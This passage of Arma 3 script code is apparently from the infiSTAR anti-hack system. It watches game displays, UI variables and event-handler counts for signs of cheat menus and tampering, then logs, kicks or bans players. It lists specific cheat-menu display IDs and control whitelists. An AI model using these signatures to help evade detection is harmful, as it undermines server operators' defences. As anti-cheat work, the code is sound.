isEqualTo currentWeapon player))then                                                                              {                                                                                    player removeItem _muzzle;                                                                                    player removeWeapon _muzzle;                                                                                    player removeMagazines _magazine;                                                                                    _log = format['No Ammo Loss - Removed Current Magazine: %1 %2 %3 %4',_muzzle,_magazine,_camm,_maxAmmo];                                                                                    [profileName,getPlayerUID player,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                              };                                                                        };                                                                        "+_lastshotmade+" = time;                                                                  };                                                            };                                                      };                                                };                                          };                                          true                                    };                                    _toCompilableString = {                                          _code = _this select 0;                                          _string = '';                                          if(typeName _code == 'CODE')then                                          {                                                _string = str(_code);                                                _arr = toArray(_string);                                                _arr set[0,32];                                                _arr set[count(_arr)-1,32];                                                _string = toString(_arr);                                          };                                          _string;                                    };                                    "+_FiredCheck+" = compileFinal ([_FiredCheck] call _toCompilableString);                                    _addCaseHDMGold = -1;                                    _addCaseMEHold = -1;                                    while {1 == 1} do                                    {                                          {(findDisplay 12 displayCtrl 51) ctrlRemoveAllEventHandlers _x;findDisplay 12 displayRemoveAllEventHandlers _x} forEach "+str _RMEH+";                                          {                                                if!(isNull (findDisplay _x))then                                                {                                                      if(_x in [49])then                                                      {                                                            (findDisplay _x) displayRemoveAllEventHandlers 'MouseZChanged';                                                            (findDisplay _x) displayRemoveAllEventHandlers 'MouseMoving';                                                            (findDisplay _x) displayRemoveAllEventHandlers 'MouseHolding';                                                      };                                                      if!(_x in [-1,106])then                                                      {                                                            (findDisplay _x) displayRemoveAllEventHandlers 'MouseButtonDown';                                                            (findDisplay _x) displayRemoveAllEventHandlers 'MouseButtonUp';                                                      };                                                      (findDisplay _x) displayRemoveAllEventHandlers 'KeyDown';                                                      (findDisplay _x) displayRemoveAllEventHandlers 'KeyUp';                                                };                                          } forEach [-1,18,49,106];                                          (findDisplay 131) displayCtrl 102 ctrlRemoveallEVenthandlers 'LBDblClick';                                          (findDisplay 131) displayCtrl 102 ctrlRemoveallEVenthandlers 'LBSelChanged';                                          _display46 = (findDisplay 46);                                          _display46 displayRemoveAllEventHandlers 'MouseButtonDown';                                          _display46 displayRemoveAllEventHandlers 'MouseButtonUp';                                          _display46 displayRemoveAllEventHandlers 'MouseMoving';                                          _display46 displayRemoveAllEventHandlers 'MouseHolding';                                          if("+str _RMW+")then{_display46 displayRemoveAllEventHandlers 'MouseZChanged';};                                          "; if(_RCK)then { _A3AHstring = _A3AHstring + "                                                _display46 displayRemoveAllEventHandlers 'KeyDown';                                                _display46 displayRemoveAllEventHandlers 'KeyUp';                                                if(isNil 'life_fnc_keyHandler')then                                                {                                                      life_fnc_keyHandler = {false};                                                }                                                else                                                {                                                      if(typeName life_fnc_keyHandler != 'CODE')then {life_fnc_keyHandler = {false};};                                                      _kdID = _display46 displayAddEventHandler ['KeyDown','_this call life_fnc_keyHandler;'];                                                };                                                "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                                      if(!isNil 'EPOCH_KeyDown')then                                                      {                                                            _kdID = _display46 displayAddEventHandler ['KeyDown','_this call EPOCH_KeyDown'];                                                      };                                                "; }; _A3AHstring = _A3AHstring + "                                                uiSleep 0.2;                                                _kd_TEST_ID = _display46 displayAddEventHandler ['KeyDown','false'];                                                if((_kd_TEST_ID - _kdID > 1) && (_kdID != 0))then                                                {                                                      if(alive player)then                                                      {                                                            if(_kdID_F > 3)then {                                                                  _log = format['KeyBinds added (%1/%2)',_kdID,_kd_TEST_ID];                                                                  [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                  [] spawn "+_AHKickOFF+";                                                            };                                                            _kdID_F = _kdID_F + 1;                                                      };                                                };                                          "; }; _A3AHstring = _A3AHstring + "                                          "; if(!_RCK)then { _A3AHstring = _A3AHstring + "                                          uiSleep 0.2;                                          "; }; _A3AHstring = _A3AHstring + "                                          if(!isNull player)then                                          {                                                if(alive player)then                                                {                                                      player removeAllEventHandlers 'Take';                                                      "; if(_MOD != 'EPOCH')then { _A3AHstring = _A3AHstring + "                                                            player removeAllEventHandlers 'Fired';                                                            player addEventHandler ['Fired',compile ('_this call '+str(_FiredCheck))];                                                      "; }; _A3AHstring = _A3AHstring + "                                                      "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                                            if(vehicle player != player)then                                                            {                                                                  if(isNull EPOCH_currentVehicle)then{EPOCH_currentVehicle = vehicle player;};                                                                  EPOCH_currentVehicle removeAllEventHandlers 'GetOut';                                                                  EPOCH_currentVehicle addEventHandler['GetOut', '_this call EPOCH_handleGetOut'];                                                            };                                                            player removeAllEventHandlers 'InventoryClosed';                                                            player addEventHandler ['InventoryClosed', {if!(EPOCH_arr_interactedObjs isEqualTo[])then{EPOCH_S_S_VEHICLES = EPOCH_arr_interactedObjs;publicVariableServer 'EPOCH_S_S_VEHICLES';EPOCH_arr_interactedObjs = [];};}];                                                            "; if(_RRH)then { _A3AHstring = _A3AHstring + "                                                                  player removeAllEventHandlers 'Respawn';                                                                  player addEventHandler ['Respawn', { (_this select 0) call EPOCH_clientRespawn }];                                                            "; }; _A3AHstring = _A3AHstring + "                                                            "; if(_RKH)then { _A3AHstring = _A3AHstring + "                                                            player removeAllEventHandlers 'Killed';                                                            player addEventHandler ['Killed',{_this call EPOCH_fnc_playerDeath}];                                                            "; }; _A3AHstring = _A3AHstring + "                                                            player removeAllEventHandlers 'Put';                                                            player addEventHandler ['Put', {(_this select 1) call EPOCH_interact; _this call EPOCH_PutHandler}];                                                            player removeAllEventHandlers 'AnimChanged';                                                            player addEventHandler ['AnimChanged', {_this call "+_infiSTAR_fnc_animchanged+"}];                                                            player addEventHandler ['Damaged',{}];                                                            player addEventHandler ['Take', {(_this select 1) call EPOCH_interact; _this call EPOCH_UnisexCheck}];                                                            "; if(!_EHF)then { _A3AHstring = _A3AHstring + "                                                                  player removeAllEventHandlers 'Fired';                                                                  player addEventHandler ['Fired',{_this call EPOCH_fnc_playerFired}];                                                                  player addEventHandler ['Fired',compile ('_this call '+str(_FiredCheck))];                                                                  player addEventHandler ['Fired',{if(inSafeZone)then {deleteVehicle (_this select 6)}}];                                                            "; }; _A3AHstring = _A3AHstring + "                                                            {                                                                  player removeAllEventHandlers _x;                                                                  _addCase = player addEventHandler [_x,{}];                                                                  if(_addCase > 0)then {                                                                        _log = format['EH_%1: %2',_x,_addCase];                                                                        [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                        [] spawn "+_AHKickOFF+";                                                                  };                                                            } forEach ['HandleHeal','Dammaged','Damaged','HitPart'];                                                            "; if(_RHD)then { _A3AHstring = _A3AHstring + "                                                                  if(_addCaseHDMGold > -1)then                                                                  {                                                                        _addCaseHDMG = player addEventHandler ['HandleDamage',{}];                                                                        if((_addCaseHDMGold + 1 != _addCaseHDMG)&&(_addCaseHDMG != 0))then                                                                        {                                                                              _log = format['EH_HandleDamage 2:   %1 should be %2',_addCaseHDMG,_addCaseHDMGold + 1];                                                                              [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                              [] spawn "+_AHKickOFF+";                                                                        };                                                                  };                                                                  player removeAllEventHandlers 'HandleDamage';                                                                  _roundRandomNumberHDMG = (round(random 3))+1;                                                                  _addCaseHDMG = 0;                                                                  for '_i' from 0 to _roundRandomNumberHDMG do                                                                  {                                                                        _addCaseHDMG = player addEventHandler ['HandleDamage',{}];                                                                  };                                                                  if(_addCaseHDMG == _roundRandomNumberHDMG)then                                                                  {                                                                        _addCaseHDMGold = _addCaseHDMG;                                                                  }                                                                  else                                                                  {                                                                        _log = format['EH_HandleDamage 1:   %1 should be %2',_addCaseHDMG,_roundRandomNumberHDMG];                                                                        [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                        [] spawn "+_AHKickOFF+";                                                                  };                                                            "; }; _A3AHstring = _A3AHstring + "                                                            if(_addCaseMEHold > -1)then                                                            {                                                                  _addCaseMEH = addMissionEventHandler ['Draw3D', {}];                                                                  if(_addCaseMEHold + 1 != _addCaseMEH)then                                                                  {                                                                        _log = format['EH_Draw3D 2:   %1 should be %2',_addCaseMEH,_addCaseMEHold + 1];                                                                        [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                        [] spawn "+_AHKickOFF+";                                                                  };                                                            };                                                            removeAllMissionEventHandlers 'Draw3D';                                                            _roundRandomNumberMEH = (round(random 3))+1;                                                            _addCaseMEH = 0;                                                            for '_i' from 0 to _roundRandomNumberMEH do                                                            {                                                                  _addCaseMEH = addMissionEventHandler ['Draw3D', {}];                                                            };                                                            if(_addCaseMEH == _roundRandomNumberMEH)then                                                            {                                                                  _addCaseMEHold = _addCaseMEH;                                                            }                                                            else                                                            {                                                                  _log = format['EH_Draw3D 1:   %1 should be %2',_addCaseMEH,_roundRandomNumberMEH];                                                                  [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                  [] spawn "+_AHKickOFF+";                                                            };                                                      "; }; _A3AHstring = _A3AHstring + "                                                      "; if(_MOD == 'AltisLife')then { _A3AHstring = _A3AHstring + "                                                            "; if(_RRH)then { _A3AHstring = _A3AHstring + "                                                            player removeAllEventHandlers 'Respawn';                                                            player addEventHandler ['Respawn', {_this call life_fnc_onPlayerRespawn}];                                                            "; }; _A3AHstring = _A3AHstring + "                                                            player removeAllEventhandlers 'InventoryClosed';                                                            player addEventHandler ['InventoryClosed', {_this call life_fnc_inventoryClosed}];                                                            "; if(_RIO)then { _A3AHstring = _A3AHstring + "                                                            player removeAllEventhandlers 'InventoryOpened';                                                            player addEventHandler ['InventoryOpened', {_this call life_fnc_inventoryOpened}];                                                            "; }; _A3AHstring = _A3AHstring + "                                                            "; if(_RKH)then { _A3AHstring = _A3AHstring + "                                                            player removeAllEventHandlers 'Killed';                                                            player addEventHandler ['Killed', {_this spawn life_fnc_onPlayerKilled}];                                                            "; }; _A3AHstring = _A3AHstring + "                                                            "; if(_RHD)then { _A3AHstring = _A3AHstring + "                                                            player removeAllEventhandlers 'HandleDamage';                                                            player addEventHandler ['HandleDamage',{_this call life_fnc_HandleDamage;}];                                                            "; }; _A3AHstring = _A3AHstring + "                                                            player addEventHandler ['Take',{_this call life_fnc_onTakeItem}];                                                            player addEventHandler ['Fired',{_this call life_fnc_onFired}];                                                            if("+str _REH+")then {player removeAllEventhandlers 'Hit';};                                                            player removeAllEventHandlers 'Damaged';                                                            player removeAllEventHandlers 'Dammaged';                                                      "; }; _A3AHstring = _A3AHstring + "                                                }                                                else                                                {                                                      _addCaseMEHold = -1;                                                      _addCaseHDMGold = -1;                                                };                                          }                                          else                                          {                                                _addCaseMEHold = -1;                                                _addCaseHDMGold = -1;                                          };                                    };                              };                              "+_AH_RunCheckARRAY+" pushBack 3;                        };                        if!(4 in "+_AH_RunCheckARRAY+")then                        {                              [_name,_puid,_admins] spawn {                                    _name = _this select 0;                                    _puid = _this select 1;                                    _admins = _this select 2;                                    disableSerialization;                                    uiSleep 5;                                    _badDialogsClose = "+str _badDialogsClose+";                                    _badDialogsKICK = "+str _badDialogsKICK+";                                    "; if(_UDW)then { _A3AHstring = _A3AHstring + "                                          _allowedDialogs = "+str _allowedDialogs+";                                          _allowedDialogs = _allowedDialogs + [0,8,12,18,46,49,70];                                          "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                                _allowedDialogs = _allowedDialogs + [-2,-3,-4,-5,-6,-7,-8,-9,-10,-11,-12,-13,-14,-15,-1500,-1900,-666,300,301,302,303,304,13377];                                          "; }; _A3AHstring = _A3AHstring + "                                          "; if(_MOD == 'AltisLife')then { _A3AHstring = _A3AHstring + "                                                _allowedDialogs = _allowedDialogs + [2001,2002,2003,2004,2005,2006,2007,2008,2009,2010,2300,2400,2520,2600,2620,2650,2700,2800,2900,3000,3100,3500,7300,38200,38300,38400,38500,39400];                                          "; }; _A3AHstring = _A3AHstring + "                                    "; }; _A3AHstring = _A3AHstring + "                                    BIS_fnc_showNotification_queue=nil;                                    missionNamespace setVariable['BIS_fnc_showNotification_queue',nil];                                    {uiNamespace setVariable[_x,nil];} forEach ['RscDisplayRemoteMissions','RscDisplayDebugPublic','RscDisplayMovieInterrupt','RscDisplayArsenal'];                                    _inventoryIds = [8,0,18,70,46,12,602,999,-1200,-1300,-1400,-1500,-1900,-8,-9,-10,-15,63,55,49,-6,24,-13,129,174,38500,7300];                                    _inventoryDisplays = ['No display'];                                    {_inventoryDisplays pushBack format['Display #%1',_x];} forEach _inventoryIds;                                    _check = -1;                                     _checkshouldbe = 14;                                    _found54 = false;                                    _lastText = '';                                    "+_toBreakDisplays+" = [];                                    while {1 == 1} do                                    {                                          if((_check != -1)&&(_check != _checkshouldbe))then                                          {                                                _log = format['MenuBasedHackCheck broken! %1/%2',_check,_checkshouldbe];                                                [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                          _check = 0;                                          {                                                _disp = _x;                                                {                                                      if(!isNull (_disp displayCtrl _x)) then                                                      {                                                            _log = format['MenuBasedHack_DISPLAY_%1_C_%2',_disp,_x];                                                            [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                } forEach [24010,24000,16030,989187,99991,16100];                                          } forEach allDisplays;                                          _check = 14;                                                                                    _uiNamespace_dynamicText = uiNamespace getVariable 'BIS_dynamicText';                                          if(!isNil '_uiNamespace_dynamicText')then                                          {                                                _allCtrls = allControls _uiNamespace_dynamicText;                                                {                                                      _txt = ctrlText _x;                                                      if(_txt != _lastText)then                                                      {                                                            if((_txt != '')&&(_txt != 'Debug Mode Enabled'))then                                                            {                                                                  _lastText = _txt;                                                                  _ltxt = toLower _txt;                                                                  {                                                                        if(_ltxt find _x != -1)then                                                                        {                                                                              _log = format['BadText: %1 - %2',_x,_txt];                                                                              [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                              [] spawn "+_AHKickOFF+";                                                                        };                                                                  } forEach "+str _verybadStrings+";                                                            };                                                      };                                                } forEach _allCtrls;                                          };                                                                                                                              {                                                if(!isNull (findDisplay _x))then                                                {                                                      _log = format['MenuBasedHack_D%1',_x];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          } forEach [-1338,-1337,17,19,30,32,45,56,64,69,71,125,132,155,156,162,165,166,167,1320,1321,2727,2928,2929,3030,316000,9899,0110,110];                                          if(!isNull (findDisplay 157))then                                          {                                                _log = 'MenuBasedHack_D157   or player opened the menu which hidden in the escape menu, at the bottom right corner.';                                                [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                          {                                                _cc1 = uiNamespace getVariable _x;                                                if(!isNil '_cc1')then                                                {                                                      _formatedcc1 = format['%1',_cc1];                                                      if(_formatedcc1 != '<null>')then                                                      {                                                            if(_formatedcc1 != 'No display')then                                                            {                                                                  _log = format['Hacked: %1 - %2',_x,_cc1];                                                                  [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                  [] spawn "+_AHKickOFF+";                                                            }                                                            else                                                            {                                                                  uiNamespace setVariable[_x,nil];                                                                  _log = format['Hacked: %1 - %2',_x,_cc1];                                                                  [_name,_puid,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                  (findDisplay 46) closeDisplay 0;                                                            };                                                      };                                                };                                          } forEach ['RscDisplayRemoteMissions','RscDisplayDebugPublic','RscDisplayMovieInterrupt','RscDisplayArsenal'];                                          "; if(_UNC)then { _A3AHstring = _A3AHstring + "                                          if!(_puid in _admins)then                                          {                                                _sHq = missionNamespace getVariable 'BIS_fnc_showNotification_queue';                                                if(!isNil '_sHq')then                                                {                                                      if(str _sHq  == '[]')then                                                      {                                                            BIS_fnc_showNotification_queue=nil;                                                            missionNamespace setVariable['BIS_fnc_showNotification_queue',nil];                                                      }                                                      else                                                      {                                                            _log = format['Hacked: showNotification - %1',_sHq];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                };                                          };                                          "; }; _A3AHstring = _A3AHstring + "                                          if(!isNull (findDisplay 148))then                                          {                                                if((lbSize 104)-1 > 3)exitWith {                                                      _log = 'Hacked: RscDisplayConfigureControllers';                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          };                                          {                                                _lbSize = lbSize _x;                                                if(_lbSize > 0)then {                                                      _log = format['lbSize %1 == %2',_x,_lbSize];                                                      [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                      lbClear _x;                                                };                                          } forEach [101,102];                                          if(!_found54)then                                          {                                                _display = findDisplay 54;                                                if(!isNull _display)then                                                {                                                      {                                                            if(_x && !isNull _display)then                                                            {                                                                  if(_found54)exitWith {};                                                                  [] spawn {                                                                        disableSerialization;                                                                        while {1 == 1} do                                                                        {                                                                              waitUntil {!isNull findDisplay 54};                                                                              _display = findDisplay 54;                                                                              _txt = _display displayCtrl 1001;                                                                              _txt ctrlSetText format['%1',localize 'STR_A3_RscDisplayInsertMarker_Title'];                                                                              _txt ctrlCommit 0;                                                                              _btn1 = _display displayCtrl 1;                                                                              _btn1 buttonSetAction '';                                                                              _btn1 ctrlCommit 0;                                                                              _btn2 = _display displayCtrl 2;                                                                              _btn2 buttonSetAction '';                                                                              _btn2 ctrlCommit 0;                                                                        };                                                                  };                                                                  _found54 = true;                                                            };                                                      } forEach [                                                            (toLower ctrlText (_display displayCtrl 1001) != toLower localize 'STR_A3_RscDisplayInsertMarker_Title'),                                                            {if(buttonAction (_display displayCtrl _x) != '')exitWith {true}; false} forEach [1,2]                                                      ];                                                };                                          };                                          _dsp163 = findDisplay 163;                                          if(!isNull _dsp163)then                                          {                                                (_dsp163 displayCtrl 101) ctrlRemoveAllEventHandlers 'LBDblClick';                                                (_dsp163 displayCtrl 101) ctrlRemoveAllEventHandlers 'LBSelChanged';                                                if((toLower ctrlText (_dsp163 displayCtrl 1000) != toLower localize 'STR_DISP_OPTIONS_SCHEME') || (buttonAction (_dsp163 displayCtrl 1) != '') || (buttonAction (_dsp163 displayCtrl 2) != ''))then                                                {                                                      _log = 'Hacked: RscDisplayControlSchemes';                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          };                                          _RscDisplayConfigureAction = uiNamespace getVariable 'RscDisplayConfigureAction';                                          if(!isNil '_RscDisplayConfigureAction')then                                          {                                                _formatedRscDisplayConfigureAction = format['%1',_RscDisplayConfigureAction];                                                if(_formatedRscDisplayConfigureAction != '<null>')then                                                {                                                      if(_formatedRscDisplayConfigureAction != 'No display')then                                                      {                                                            _actions = [buttonAction 1,buttonAction 107,buttonAction 104,buttonAction 106,buttonAction 109,buttonAction 105,buttonAction 108];                                                            _title = ctrlText 1000;                                                            if(_title != localize '$STR_A3_RscDisplayConfigureAction_Title')exitWith {                                                                  _log = 'Hacked: RscDisplayConfigureAction';                                                                  [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                  [] spawn "+_AHKickOFF+";                                                            };                                                            {                                                                  if(_x != '')exitWith {                                                                        _log = 'Hacked: RscDisplayConfigureAction';                                                                        [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                        [] spawn "+_AHKickOFF+";                                                                  };                                                            } forEach _actions;                                                      };                                                };                                          };                                          _c101txt = ctrlText 101;                                          if!(_c101txt in ['','\A3\Data_F_Mark\Logos\arma3_Mark_logo_ca.paa','\A3\Data_F_Kart\Logos\arma3_karts_logo_ca.paa'])then                                          {                                                _log = format['ctrlText 101: %1',_c101txt];                                                [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                          _fkd = 'no';{if(!isNull (findDisplay _x))exitWith {_fkd = str _x;};} forEach _badDialogsKICK;                                          if(_fkd != 'no')then                                          {                                                _log = format['BadDisplayID: %1',_fkd];                                                [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                          {if(!isNull (findDisplay _x))then {closeDialog 0;(findDisplay _x) closeDisplay 0;closeDialog 0;closeDialog 0;};} forEach _badDialogsClose;                                          "; if(_UDW)then { _A3AHstring = _A3AHstring + "                                                _break = true;                                                {if(!isNull (findDisplay _x))exitWith {_break = false;};} forEach _allowedDialogs;                                                "; if(_GCC)then { _A3AHstring = _A3AHstring + "                                                if(!isNull (findDisplay 602))then                                                {                                                      _baddisplays = [];                                                      {                                                            _strCdisplay = str _x;                                                            if(_strCdisplay in ['Display #4','Display #5','Display #6'])exitWith                                                            {                                                                  findDisplay 4 closeDisplay 0;                                                                  findDisplay 5 closeDisplay 0;                                                                  findDisplay 6 closeDisplay 0;                                                                  findDisplay 602 closeDisplay 0;                                                                  closeDialog 0;closeDialog 0;closeDialog 0;                                                            };                                                            if!(_strCdisplay in _inventoryDisplays)then                                                            {                                                                  _baddisplays pushBack _strCdisplay;                                                                  _break = true;                                                            };                                                      } forEach allDisplays;                                                      if!(_baddisplays isEqualTo [])then                                                      {                                                            if('Display #72' in _baddisplays)then                                                            {                                                                  _log = format['BadInventory Displays: %1   (72 is Lystic Hack v3)',_baddisplays];                                                                  [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                  [] spawn "+_AHKickOFF+";                                                            }                                                            else                                                            {                                                                  _log = format['BadInventory Displays: %1   (inventory closed)',_baddisplays];                                                                  [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                            };                                                      };                                                };                                                "; }; _A3AHstring = _A3AHstring + "                                                if(_break)then                                                {                                                      if(dialog)then                                                      {                                                            if(isNil'"+_toBreakDisplays+"') then                                                            {                                                                  if(typeName "+_toBreakDisplays+" != 'ARRAY') then                                                                  {                                                                        _log = 'BreakDisplays is Nil';                                                                        [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                        [] spawn "+_AHKickOFF+";                                                                  };                                                            }                                                            else                                                            {                                                                  if(typeName "+_toBreakDisplays+" != 'ARRAY') then                                                                  {                                                                        _log = format['BreakDisplays TypeName changed to %1',typeName "+_toBreakDisplays+"];                                                                        [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                        [] spawn "+_AHKickOFF+";                                                                  };                                                            };                                                            {                                                                  _strx = (str _x);                                                                  if!(_strx in "+_toBreakDisplays+") then                                                                  {                                                                        "+_toBreakDisplays+" pushBack (str _x);                                                                        _log = format['Bad-Displays: %1   (closed)',_toBreakDisplays];                                                                        [_name,_puid,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                  };                                                            } forEach allDisplays;                                                            closeDialog 0;closeDialog 0;closeDialog 0;                                                      };                                                };                                          "; }; _A3AHstring = _A3AHstring + "                                          uiSleep 0.25;                                    };                              };                              "+_AH_RunCheckARRAY+" pushBack 4;                        };                        if!(5 in "+_AH_RunCheckARRAY+")then                        {                              "; if(_GCC || _C00 || _C12 || _C18 || _C24 || _C46 || _C70)then { _A3AHstring = _A3AHstring + "                              [_name,_puid] spawn {                                    disableSerialization;                                    _name = _this select 0;                                    _puid = _this select 1;                                    uiSleep 10;                                    "; if(_GCC)then { _A3AHstring = _A3AHstring + "                                    _badcontrols602 = false;                                    "; }; _A3AHstring = _A3AHstring + "                                    "; if(_C00)then { _A3AHstring = _A3AHstring + "                                    _badcontrols00 = false;                                    _00controlsO =                                    [                                          'Control #114998','Control #115099','Control #114999','Control #115000','Control #115001','Control #115002','Control #115003','Control #115004',                                          'Control #115005','Control #115010','Control #115011','Control #115012','Control #115013','Control #115014','Control #115015','Control #115020',                                          'Control #115021','Control #115022','Control #115023','Control #115024','Control #115025','Control #115030','Control #115031','Control #115032',                                          'Control #115033','Control #115034','Control #115035','Control #115040','Control #115041','Control #115042','Control #115043','Control #115044',                                          'Control #115045','Control #115050','Control #115051','Control #115052','Control #115053','Control #115054','Control #115055','Control #1050','Control #147',                                          'Control #148','Control #146','Control #141','Control #-1','Control #115','Control #1202','Control #1003','Control #109','Control #138','Control #101',                                          'Control #150','Control #151','Control #103','Control #105','Control #142','Control #2423','Control #149','Control #152','Control #2421','Control #143',                                          'Control #2422','Control #102','Control #301','Control #302','Control #303','Control #307','Control #1001','Control #140','Control #2405','Control #106',                                          'Control #104','Control #2300','Control #1009','Control #1002','Control #1005','Control #1004','Control #1006','Control #118','Control #1008','Control #145',                                          'Control #144','Control #1555',                                          'Control #2222710','Control #2222711','Control #2222712','Control #2222713','Control #121'                                    ];                                    "; }; _A3AHstring = _A3AHstring + "                                    "; if(_C12)then { _A3AHstring = _A3AHstring + "                                    _badcontrols12 = false;                                    _12controlsO =                                    [                                          'Control #-1','Control #-1','Control #-1','Control #-1','Control #51','Control #2350','Control #235000','Control #235001',                                          'Control #235002','Control #235003','Control #235004','Control #235005','Control #235006','Control #1016','Control #1020',                                          'Control #1200','Control #1021','Control #1022','Control #1023','Control #112','Control #2','Control #2302','Control #111',                                          'Control #1014','Control #116','Control #1205','Control #1202','Control #1201','Control #1204','Control #101','Control #107',                                          'Control #1001','Control #1002','Control #1013','Control #1003','Control #106','Control #75','Control #77','Control #1008',                                          'Control #78','Control #1015','Control #1005','Control #103','Control #63','Control #64','Control #65','Control #66',                                          'Control #67','Control #68','Control #69','Control #70','Control #71','Control #72','Control #1099','Control #1124',                                          'Control #1125','Control #47060','Control #47061','Control #47062','Control #47063','Control #47065','Control #47066',                                          'Control #47064','Control #-1','Object Control #102'                                    ];                                    _12controlscntO = count _12controlsO;                                    "; }; _A3AHstring = _A3AHstring + "                                    "; if(_C18)then { _A3AHstring = _A3AHstring + "                                    _badcontrols18 = false;                                    _18controlsO =                                    [                                          'Control #-1','Control #999','Control #-1','Control #-1','Control #1000','Control #1001','Control #1002','Control #1003',                                          'Control #1102','Control #103','Control #1013','Control #2301','Control #1009','Control #1101'                                    ];                                    _18controlscntO = count _18controlsO;                                    "; }; _A3AHstring = _A3AHstring + "                                    "; if(_C24)then { _A3AHstring = _A3AHstring + "                                    _badcontrols24 = false;                                    _24controlsO = ['Control #-1','Control #101'];                                    "; }; _A3AHstring = _A3AHstring + "                                    "; if(_C46)then { _A3AHstring = _A3AHstring + "                                    _badcontrols46 = false;                                    _46controlsO =                                    [                                          'Control #1202','Control #11400','Control #1001','Control #1000','Control #11406','Control #1010','Control #102','Control #100',                                          'Control #1011','Control #101','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1',                                          'Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1',                                          'Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1',                                          'Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1',                                          'Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1',                                          'Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1',                                          'Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1',                                          'Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1',                                          'Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1','Control #-1'                                    ];                                    _46controlscntO = count _46controlsO;                                    "; }; _A3AHstring = _A3AHstring + "                                    "; if(_C70)then { _A3AHstring = _A3AHstring + "                                    _badcontrols70 = false;                                    _70controlsO =                                    [                                          'Control #114998','Control #115099','Control #114999','Control #115000','Control #115001','Control #115002','Control #115003','Control #115004','Control #115005',                                          'Control #115010','Control #115011','Control #115012','Control #115013','Control #115014','Control #115015','Control #115020','Control #115021','Control #115022',                                          'Control #115023','Control #115024','Control #115025','Control #115030','Control #115031','Control #115032','Control #115033','Control #115034','Control #115035',                                          'Control #115040','Control #115041','Control #115042','Control #115043','Control #115044','Control #115045','Control #115050','Control #115051','Control #115052',                                          'Control #115053','Control #115054','Control #115055','Control #1080','Control #1081','Control #1082','Control #1083','Control #1084','Control #1085','Control #1086',                                          'Control #1087','Control #1000','Control #1002','Control #101','Control #1006','Control #102','Control #1008','Control #125','Control #126','Control #127','Control #701',                                          'Control #121','Control #1004','Control #103','Control #104','Control #105','Control #106','Control #107','Control #132','Control #109','Control #114','Control #117',                                          'Control #118','Control #128','Control #130','Control #116','Control #1','Control #2','Control #108','Control #1011','Control #1013','Control #1015','Control #131'                                    ];                                    _70controlscntO = count _70controlsO;                                    "; }; _A3AHstring = _A3AHstring + "                                    while {1 == 1} do                                    {                                          "; if(_GCC)then { _A3AHstring = _A3AHstring + "                                          if(!_badcontrols602)then                                          {                                                if(!isNull findDisplay 602)then                                                {                                                      _cntallCtrls602 = count(allControls findDisplay 602);                                                      "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                                      _ctrlcount602 = 87;                                                      if(_cntallCtrls602 != _ctrlcount602)then                                                      {                                                            _log = format['BadControls count on D602: %1 should be %2',_cntallCtrls602,_ctrlcount602];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            (findDisplay 602) closeDisplay 0;closeDialog 0;closeDialog 0;closeDialog 0;                                                            _badcontrols602 = true;                                                            [] spawn 